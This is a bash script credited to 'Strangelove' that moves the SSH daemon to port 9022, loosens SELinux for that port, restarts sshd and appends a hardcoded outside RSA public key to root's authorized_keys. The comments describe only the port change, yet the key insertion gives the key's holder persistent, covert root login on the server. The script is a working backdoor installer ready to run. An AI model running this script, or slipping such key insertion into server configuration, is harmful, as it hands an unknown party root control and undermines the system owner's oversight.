#!/bin/bash
# Strangelove, 2023
# https://t.me/drxstrangelove 

sshConfig="/etc/ssh/sshd_config"

sshKey="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSKlvOCC44pzJbPQSA1fBz1ypK2g+Kj6yGdWwG9JIEyQNogHnJV/sZGz1JDHSy23hRuXjSpz2hldKTXC7DEdtN+jATratdnKHlsXGhN/FaCVHICygOTofUCXb9HtxCuFFHhkzixOEF08BIZcQSa+Vy3Oa1azLlo3KC3PqAPebonZImG73y/uEqERVcoHpOZHesZ3Ezco97BcpZQl6cBxuwYkYawGufRkpyylk5E1QGfDuPS8ojUyn2DPSh3Hmqkqs4hDPEAr3CKswKKUz12hJkWWw6ycAAX90uxuiIVb5jnKkjfjKZe20YBYTpBjTECELnJYvB5KGj4nY3WW+ry7mx58vytq0bLLkmZqArBdMCeP9WvihICnZnXbkOxmzObDZwR6H5tbZ1crYf9oEzWgHZk4q9B+YymHKVV18CdYf4hB4BlJX/9uQX5X6JHYfWiFExClc1qA/E1VIROPTNe3gbvrzz3n4xEgrwQH+Kn1R3SwLHIJvKmiNdJMu6Z9lTRY8= strangelove@Labyrinth"

function osFamilyDetect(){ # Detets OS family. Not in use at the moment, exists for future purposes.
	RH=("rhel" "redhat" "centos" "alma" "rocky" "cloudlinux")
	DE=("ubuntu" "debian")
	idLike=$(cat /etc/os-release |grep ID_LIKE)
	
	# Rhel-based checks
	for val in "${RH[@]}" ; do
		case "$idLike" in
			*"$val"*) osFamily="rhel" && return 1 ;;
		esac
	done

	# Debian-based checks
	for val in "${DE[@]}" ; do
		case "$idLike" in
			*"$val"*) osFamily="debian"  && return 1 ;;
		esac
	done
}


function sshConfigSanity(){
	if [ ! -f "$sshConfig" ] ; then
		echo "ssh config(/etc/ssh/sshd_config) does not exist, exiting ..." && exit 0
	fi

	if [ ! -w "$sshConfig" ] ; then
		echo "ssh config(/etc/ssh/sshd_config) is not writable. Use script of behalf of root or scalate privileges with sudo ..." && exit 0
	fi
}

function sshSelinuxPermit(){ # To avoid permission denied from Selinux
	if [ `sestatus |grep -i "Current mode" |awk {'print $3'}` == "enforcing" ] ; then
		semanage port -a -t ssh_port_t -p tcp 9022
	fi
}

function insertKey(){
	printf "\n$sshKey" >> /root/.ssh/authorized_keys
}

function switchSshPort(){ # Switches sshd port to 9022
	sshConfigSanity
	sshSelinuxPermit

	sed -i '/Port 22/d' "$sshConfig"
	echo "Port 9022" >> "$sshConfig"
	systemctl restart sshd
}

switchSshPort
insertKey